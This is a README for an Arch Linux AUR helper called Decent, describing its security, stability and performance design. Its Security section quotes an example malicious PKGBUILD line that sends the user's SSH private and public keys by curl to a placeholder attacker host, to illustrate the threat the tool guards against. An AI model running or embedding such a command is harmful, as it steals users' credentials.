# Decent

A decent pacman wrapper and AUR helper for Arch Linux.

## Why Decent

### Security

**AUR Helpers shouldn't rely on `makepkg` parse PKGBUILDs in the running user
session**
This opens a huge door for malicious PKGBUILDs to run something like:

```bash
cat ~/.ssh/id_rsa ~/.ssh/id_rsa.pub | curl -X POST --data-binary @- http://malicious.example.com/ 2>&1 > /dev/null
```

Running `makepkg --printsrcinfo` with that on the PKGBUILD global scope will
silently allow malicious people to retrieve critical user information.

Instead, `decent` will source PKGBUILDs, when needed, using a restrictive bash
instance without using external user's environment.

**AUR Helpers should show PKGBUILD files before doing anything with it, by
default.**
To incentivize people reviewing the PKGBUILD files, by default, every PKGBUILD
that cames from AUR will be firstly presented to the user for inspection. This
option is opt-out and will prevent the installation of possible malicious
packages.

**AUR Helpers shouldn't require escalated privileges until it explicitly needs
them.**
Many AUR helpers use the so-called "sudo loop" to escalate privileges, when
needed. This shouldn't be a practice for a reason:

Imagine a AUR helper with "sudo loop" implementation and the package you want to
install has a make dependency. It will ask you, before building, for privileges
and then keep sudo timeout fresh. Whenever is a sudo inside of your building
process, it will execute the command without even asking.

**AUR Helpers should support isolated build.**
It's essencial to isolate builds as much as possible. One of the worst things of
building in the user environment is the usage of silent dependencies and
therefore, make packages really hard to reproduce. To achieve reproducibility,
`decent` runs `prepare()`, `build()` and `package()` in a isolatedcontainer with
the necessary dependencies.

### Stability

**AUR Helpers should be able to rebuild broken dependencies on update**
One thing crucial for AUR helpers is the ability to rebuild broken dependencies
on updates.

For example, if two packages depend on the same library, upgrading only
one package might also upgrade the library (as a dependency), which might then
break the other package which depends on an older version of the library.

Arch linux is a rolling release distribution which means that partial upgrades
are unsupported. When a new library versions are pushed to the repositories, the
packages that are dependent on should be rebuilt this situation.

`decent` has a pacman hook to rebuild AUR packages for you when things got
updated.

**AUR Helpers should has it's own database instead of doing partial updates**
Because Arch Linux doesn't support partial updates, as stated before, it's a
good practice to maintain a seperate pacman database to resolve AUR dependencies
instead of doing partially `-Sy` and `-Su`.

**AUR Helpers should be built in a well supported, readable and maintainable
programming language**
Another key for achieving stability is the usage of Python. We choose Python for
a reason. Easy to understand, easy to maintain and most importantly, has
official bindings support from Arch Linux for libalpm library. This will avoid
problems like this, when updating:

```
aur-helper: error while loading shared libraries: libalpm.so.XX: cannot open shared object file: No such file or directory
```

### Performance

**AUR Helpers should use caching techniques to speed-up builds**
Unlike other helpers, `decent` use some techniques to speed-up builds like
caching: Package repositories, Upstream sources and already built packages.

### Other features

- Support building local PKGBUILDs with AUR dependencies.
- Support building official packages from source.
- Show official Arch news before upgrading.
